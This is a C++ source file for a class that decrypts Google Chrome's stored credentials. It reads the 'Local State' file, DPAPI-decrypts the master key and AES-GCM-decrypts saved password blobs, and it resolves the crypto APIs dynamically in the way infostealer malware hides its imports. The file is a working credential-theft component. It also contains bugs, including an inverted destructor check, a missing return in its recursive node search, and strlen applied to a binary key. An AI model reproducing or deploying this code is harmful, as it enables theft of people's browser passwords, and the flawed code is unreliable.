#include "../includes/ChromeDecrypt.h"
#include "../includes/Base64.h"

ChromeDecrypt::ChromeDecrypt() 
{

	m_tempSaver = new char[MAX_SIZE];
	//get functions
	m_BCryptDecrypt = WinApiImport<f_BCryptDecrypt>::get("BCryptDecrypt", "bcrypt.dll");
	m_CryptUnprotectData = WinApiImport<f_CryptUnprotectData>::get("CryptUnprotectData", "crypt32.dll");
	m_BCryptOpenAlgorithmProvider = WinApiImport<f_BCryptOpenAlgorithmProvider>::get("BCryptOpenAlgorithmProvider", "bcrypt.dll");
	m_BCryptSetProperty = WinApiImport<f_BCryptSetProperty>::get("BCryptSetProperty", "bcrypt.dll");
	m_BCryptGenerateSymmetricKey = WinApiImport<f_BCryptGenerateSymmetricKey>::get("BCryptGenerateSymmetricKey", "bcrypt.dll");
}

ChromeDecrypt::~ChromeDecrypt()
{
	if (!m_tempSaver)
		delete m_tempSaver;
}

bool ChromeDecrypt::initDecryptor(const String& path)
{
	std::string keyBase64;
	char key[8192];
	DWORD size = 0;
	//get the key and decrypt it
	if (!getChromeKey(keyBase64, size, path) || !decryptKey(keyBase64, size, key))
	{
		return false;
	}
	//init the alg and key handlers
	initHandlers((PBYTE)key, strlen(key));
	return true;
}

bool ChromeDecrypt::decrypt(const String& encrypted, String& decrypted, int size)
{
	auto password = const_cast<char*>(encrypted.c_str());
	 
	//check the version
	if ((encrypted[0] == 'v' &&encrypted[1] == '1' && encrypted[2] == '0') ||
		(encrypted[0] == 'v' && encrypted[1] == '1' && encrypted[2] == '1'))
	{

		ULONG cbOutput = MAX_SIZE;
		ULONG cbCiphertext = 0;


		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO BACMI;
		BCRYPT_INIT_AUTH_MODE_INFO(BACMI);

		BACMI.pbNonce = (PUCHAR)(password + 3);
		BACMI.cbNonce = 12;

		BACMI.pbTag = (PUCHAR)(password + size - 16);
		BACMI.cbTag = 16;


		if (!BCRYPT_SUCCESS(m_BCryptDecrypt(m_keyHandler, (BYTE*)(password + 15), size - 15 - 16, &BACMI, NULL, 0, (PUCHAR)m_tempSaver, cbOutput, &cbCiphertext, 0)))
		{
			return false;
		}

		m_tempSaver[cbCiphertext] = '\0';
		decrypted = m_tempSaver;

		return true;
	}

	char decryptedPass[1024];

	if (!decryptDPAPI(reinterpret_cast<BYTE*>(password), size, decryptedPass))
	{
		return false;
	}

	decrypted = decryptedPass;
	return true;
}

inline bool ChromeDecrypt::getChromeKey(std::string& key, unsigned long& size, const String& path)
{
	int local_app_data = 0x001c;
	String keyPath = IO::get_app_folder(local_app_data);
	if (keyPath.empty())
		return false;

	keyPath += path + R"(\User Data\Local State)";
	String jsonStr;

	if (!IO::is_file_exists(keyPath) || !IO::read_file(keyPath, jsonStr))
		return false;


	const auto jsonObj = cJSON_Parse(jsonStr.c_str());
	if (!jsonObj)
		return false;

	if (const auto node = findNode(jsonObj->child, "os_crypt"))
	{
		key = cJSON_GetStringValue(node->child);
		size = key.length();
	}

	return true;
}

bool ChromeDecrypt::decryptKey(std::string key, DWORD size, char* decKey)
{
	char* keyEncDPAPI = new char[size];
	DWORD keyEncDPAPISize = 0;
	BYTE* keyEnc = NULL;
	DWORD keyEncSize = 0;
	//the key is in base 64 so we need to decode it 
	auto keyDec = base64_decryptor::base64_decode(key);

	keyEncDPAPISize = keyDec.length();

	keyEncDPAPI = (char*)keyDec.c_str();

	//remove 5 bytes
	keyEnc = new BYTE[keyEncDPAPISize - DPAPI_PREFIX_LEN];

	//copy all starting from byte 5 
	int counter = 0;
	for (int i = DPAPI_PREFIX_LEN; i < keyEncDPAPISize; i++)
	{
		keyEnc[counter++] = keyEncDPAPI[i];
	}
	//decrypt the key
	if (decryptDPAPI(keyEnc, (keyEncDPAPISize - DPAPI_PREFIX_LEN), decKey))
	{
		delete[] keyEnc;
		return true;
	}

	return false;
}

bool ChromeDecrypt::decryptDPAPI(unsigned char* encData, unsigned long size, char* decData)
{
	DATA_BLOB enc;
	DATA_BLOB dec;

	enc.cbData = size;
	enc.pbData = encData;

	if (m_CryptUnprotectData(&enc, NULL, NULL, NULL, NULL, 0, &dec))
	{
		for (int i = 0; i < dec.cbData; i++)
			decData[i] = dec.pbData[i];
		decData[dec.cbData] = '\0'; //add null terminator

		return true;
	}

	return false;
}

bool ChromeDecrypt::initHandlers(PBYTE key, ULONG size)
{ 
	//init alg handler
	if (m_BCryptOpenAlgorithmProvider(&m_algHandler, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
	{
		return false;
	}


	if (m_BCryptSetProperty(m_algHandler, BCRYPT_CHAINING_MODE, 
		(PUCHAR)BCRYPT_CHAIN_MODE_GCM,sizeof(BCRYPT_CHAIN_MODE_GCM),0) != 0)
	{
		return false;
	}
	//init key handler 
	if (m_BCryptGenerateSymmetricKey(m_algHandler, &m_keyHandler, NULL, 0, key, size, 0) != 0)
	{
		return false;
	}
	return true;
	
}

cJSON* ChromeDecrypt::findNode(cJSON* node, const char* key)
{
	if (!node) 
		return nullptr;

	if (strcmp(node->string, key) == 0)
	{
		return node;
	}

	findNode(node->next, key);
}